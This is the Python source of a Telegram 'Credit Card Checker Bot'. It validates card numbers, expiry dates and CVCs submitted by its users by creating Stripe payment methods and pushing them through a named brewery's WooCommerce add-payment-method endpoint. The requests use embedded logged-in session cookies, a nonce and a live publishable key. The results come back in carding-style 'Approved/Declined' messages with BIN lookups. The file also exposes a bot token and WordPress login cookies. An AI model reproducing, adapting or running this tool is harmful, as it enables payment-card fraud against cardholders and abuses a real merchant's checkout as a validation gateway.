import requests
import time
import re
import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# Bot token - Replace with your actual bot token
BOT_TOKEN = "8287016181:AAGyZ4o1fRPlhxSE8LgP9cDTUK9AEi6vI-E"

# Wiseacre Brewing site cookies and headers for proper responses
WISEACRE_COOKIES = {
    '_fbp': 'fb.1.1760821136387.980145351698458486',
    '_ga': 'GA1.1.1926474615.1760821139',
    '_gcl_au': '1.1.668956566.1760821139',
    '_ga_X4MX4PV4RP': 'GS2.1.s1760821138$o1$g0$t1760821141$j57$l0$h0',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2025-10-18%2020%3A59%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Fshop.wiseacrebrew.com%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwiseacrebrew.com%2F',
    'sbjs_first_add': 'fd%3D2025-10-18%2020%3A59%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Fshop.wiseacrebrew.com%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwiseacrebrew.com%2F',
    'sbjs_current': 'typ%3Dreferral%7C%7C%7Csrc%3Dwiseacrebrew.com%7C%7C%7Cmdm%3Dreferral%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%2F%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29',
    'sbjs_first': 'typ%3Dreferral%7C%7C%7Csrc%3Dwiseacrebrew.com%7C%7C%7Cmdm%3Dreferral%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%2F%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%20Chrome%2F141.0.0.0%20Safari%2F537.36',
    'mtk_src_trk': '%7B%22type%22%3A%22referral%22%2C%22url%22%3A%22https%3A%2F%2Fwiseacrebrew.com%2F%22%2C%22mtke%22%3A%22(none)%22%2C%22utm_campaign%22%3A%22(none)%22%2C%22utm_source%22%3A%22wiseacrebrew.com%22%2C%22utm_medium%22%3A%22referral%22%2C%22utm_content%22%3A%22%2F%22%2C%22utm_id%22%3A%22(none)%22%2C%22utm_term%22%3A%22(none)%22%2C%22session_entry%22%3A%22https%3A%2F%2Fshop.wiseacrebrew.com%2F%22%2C%22session_start_time%22%3A%222025-10-18%2020%3A59%3A04%22%2C%22session_pages%22%3A%221%22%2C%22session_count%22%3A%221%22%7D',
    '__stripe_mid': 'e8951d46-1d16-4116-a35a-7b8be05c7a772426c9',
    'wordpress_sec_dedd3d5021a06b0ff73c12d14c2f177c': 'pelejab257%7C1762032175%7CmNgJQpT0a94xiyKnlVzS3CqeSQJUyppCw4NmRrsZaUv%7C35f40c1eb81ac981915fb3422fc88f95f92081ba49056a0edfae46f05c9479d8',
    'wordpress_logged_in_dedd3d5021a06b0ff73c12d14c2f177c': 'pelejab257%7C1762032175%7CmNgJQpT0a94xiyKnlVzS3CqeSQJUyppCw4NmRrsZaUv%7Caae41ceb18df452927078d0fd7ed901dcef2e6a54cbec72043f1da3e27f84587',
    '_ga_94LZDRFSLM': 'GS2.1.s1760824445$o2$g0$t1760824445$j60$l0$h0',
}

WISEACRE_HEADERS = {
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://shop.wiseacrebrew.com',
    'priority': 'u=1, i',
    'referer': 'https://shop.wiseacrebrew.com/account/add-payment-method/',
    'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

# Stripe API configuration for payment method creation
STRIPE_HEADERS = {
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'priority': 'u=1, i',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
}

# Stripe public key
STRIPE_PUBLIC_KEY = "pk_live_51Aa37vFDZqj3DJe6y08igZZ0Yu7eC5FPgGbh99Zhr7EpUkzc3QIlKMxH8ALkNdGCifqNy6MJQKdOcJz3x42XyMYK00mDeQgBuy"

def check_card(card_number, exp_month, exp_year, cvc):
    """Check credit card using Wiseacre Brewing site's WordPress/WooCommerce setup intent API"""
    try:
        # Step 1: Create payment method using Stripe API
        stripe_data = f'type=card&card[number]={card_number}&card[cvc]={cvc}&card[exp_year]={exp_year}&card[exp_month]={exp_month}&allow_redisplay=unspecified&billing_details[address][country]=US&pasted_fields=number&payment_user_agent=stripe.js%2F90ba939846%3B+stripe-js-v3%2F90ba939846%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fshop.wiseacrebrew.com&time_on_page=3174183&client_attribution_metadata[client_session_id]=a91408ea-6de3-4b0a-9216-9e8e0dba6155&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=94b65d24-19a4-416d-b0fc-b287f2691d9e&guid=52a2cfc3-910c-484c-9b29-4397e9b7898b6adb02&muid=e8951d46-1d16-4116-a35a-7b8be05c7a772426c9&sid=b07d314d-79c8-4935-a417-acef431354f2a47e66&key={STRIPE_PUBLIC_KEY}&_stripe_version=2024-06-20'
        
        stripe_response = requests.post('https://api.stripe.com/v1/payment_methods', headers=STRIPE_HEADERS, data=stripe_data)
        
        if stripe_response.status_code != 200:
            stripe_json = stripe_response.json()
            error_message = stripe_json.get('error', {}).get('message', 'Unknown error')
            return f"Declined - {error_message}"
        
        stripe_json = stripe_response.json()
        payment_method_id = stripe_json.get('id')
        
        if not payment_method_id:
            return "Declined - Invalid payment method"
        
        # Step 2: Use Wiseacre Brewing's WordPress/WooCommerce setup intent API
        wiseacre_data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_method_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': '2fde965383',
        }
        
        wiseacre_response = requests.post(
            'https://shop.wiseacrebrew.com/wp/wp-admin/admin-ajax.php', 
            cookies=WISEACRE_COOKIES, 
            headers=WISEACRE_HEADERS, 
            data=wiseacre_data
        )
        
        if wiseacre_response.status_code == 200:
            try:
                wiseacre_json = wiseacre_response.json()
                
                # Check for success
                if wiseacre_json.get('success'):
                    return "Payment method added successful"
                
                # Check for specific error messages
                error_data = wiseacre_json.get('data', {})
                error_message = error_data.get('message', 'Unknown error')
                
                # Parse common error messages
                if 'declined' in error_message.lower():
                    return "Your card was declined"
                elif 'insufficient' in error_message.lower():
                    return "Insufficient funds"
                elif 'expired' in error_message.lower():
                    return "Card expired"
                elif 'invalid' in error_message.lower():
                    return "Invalid card"
                elif 'blocked' in error_message.lower():
                    return "Card blocked"
                else:
                    return f"Declined - {error_message}"
                    
            except:
                return "Declined - Invalid response"
        else:
            return "Declined - Server error"
            
    except Exception as e:
        return f"Error - {str(e)}"

def get_bin_info(card_number):
    """Get BIN information from antipublic.cc API"""
    try:
        data = requests.get('https://bins.antipublic.cc/bins/' + card_number[:6]).json()
    except Exception as e:
        data = {}  # If BIN API fails, use empty data
    
    brand = data.get('brand', 'Unknown')
    card_type = data.get('type', 'Unknown')
    country = data.get('country_name', 'Unknown')
    country_flag = data.get('country_flag', '🏳️')
    bank = data.get('bank', 'Unknown')
    
    return {
        'brand': brand,
        'type': card_type,
        'country': country,
        'flag': country_flag,
        'bank': bank
    }

def parse_card_input(text):
    """Parse card input in format: 51631030099XXXXX|08|26|155"""
    try:
        parts = text.split('|')
        if len(parts) != 4:
            return None
        
        card_number = parts[0].replace(' ', '').replace('-', '')
        exp_month = parts[1].zfill(2)
        exp_year = parts[2]
        cvc = parts[3]
        
        # Validate card number length
        if len(card_number) < 13 or len(card_number) > 19:
            return None
            
        return {
            'number': card_number,
            'month': exp_month,
            'year': exp_year,
            'cvc': cvc
        }
    except:
        return None

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command"""
    await update.message.reply_text(
        "🔐 <b>Credit Card Checker Bot</b>\n\n"
        "Send me a credit card in this format:\n"
        "<code>/st 51631030099XXXXX|08|26|155</code>\n\n"
        "Or just send the card details directly!\n\n"
        "<b>Bot by:</b> @Rar_Xd",
        parse_mode='HTML'
    )

async def st_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /st command for card checking"""
    if not context.args:
        await update.message.reply_text(
            "❌ <b>Invalid Format!</b>\n\n"
            "Use: <code>/st 51631030099XXXXX|08|26|155</code>",
            parse_mode='HTML'
        )
        return
    
    card_input = ' '.join(context.args)
    await check_card_command(update, context, card_input)

async def check_card_command(update: Update, context: ContextTypes.DEFAULT_TYPE, card_input=None):
    """Main card checking function"""
    if card_input is None:
        card_input = update.message.text
    
    # Parse card input
    card_data = parse_card_input(card_input)
    if not card_data:
        await update.message.reply_text(
            "❌ <b>Invalid Card Format!</b>\n\n"
            "Please use format: <code>51631030099XXXXX|08|26|155</code>\n"
            "Or: <code>/st 51631030099XXXXX|08|26|155</code>",
            parse_mode='HTML'
        )
        return
    
    # Send processing message
    processing_msg = await update.message.reply_text("🔄 <b>Checking card...</b>", parse_mode='HTML')
    
    start_time = time.time()
    
    # Check card
    result = check_card(
        card_data['number'],
        card_data['month'],
        card_data['year'],
        card_data['cvc']
    )
    
    # Get BIN info
    bin_info = get_bin_info(card_data['number'])
    
    end_time = time.time()
    execution_time = end_time - start_time
    
    # Format response message
    cc = card_data['number']
    gate = "Wiseacre Brewing"
    last = result
    
    # Determine status emoji and title based on result
    if "Payment method added successful" in result:
        status_emoji = "✅"
        status_title = "𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙"
    elif "declined" in result.lower() or "insufficient" in result.lower() or "expired" in result.lower() or "invalid" in result.lower() or "blocked" in result.lower():
        status_emoji = "❌"
        status_title = "𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙"
    else:
        status_emoji = "⚠️"
        status_title = "𝙀𝙧𝙧𝙤𝙧"
    
    msg = f'''<b>{status_emoji} {status_title} {status_emoji}</b>	   
<b>[↯] 𝗖𝗖 ⇾</b> <code>{cc}</code>
<b>[↯] 𝗚𝗔𝗧𝗘𝗦 ⇾</b> {gate}
<b>[↯] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 →</b> {last}
<b>[↯] 𝗕𝗜𝗡 →</b> {cc[:6]} - {bin_info['type']} - {bin_info['brand']}
<b>[↯] 𝗕𝗮𝗻𝗸 →</b> {bin_info['bank']}
<b>[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 →</b> {bin_info['country']} {bin_info['flag']}
<b>[↯] 𝗧𝗶𝗺𝗲 𝗧𝗮𝗸𝗲𝗻 ⇾</b> {"{:.1f}".format(execution_time)} seconds.
<b>𝗕𝗼𝘁 𝗕𝘆 ⇾</b> @Rar_Xd'''
    
    # Edit the processing message with results
    await processing_msg.edit_text(msg, parse_mode='HTML')

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle regular messages"""
    message_text = update.message.text
    
    # Check if message contains card pattern
    if '|' in message_text and len(message_text.split('|')) == 4:
        await check_card_command(update, context, message_text)
    else:
        await update.message.reply_text(
            "❌ <b>Invalid Format!</b>\n\n"
            "Please send card in format: <code>51631030099XXXXX|08|26|155</code>\n"
            "Or use: <code>/st 51631030099XXXXX|08|26|155</code>",
            parse_mode='HTML'
        )

def main():
    """Start the bot"""
    print("🤖 Starting Credit Card Checker Bot...")
    print("📡 Bot will use Wiseacre Brewing site for authentic responses")
    
    # Create application with minimal configuration to avoid compatibility issues
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("st", st_command))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    # Start bot
    print("✅ Bot Started Successfully!")
    print("🔗 Bot is now running and ready to check cards!")
    application.run_polling()

if __name__ == '__main__':
    main()
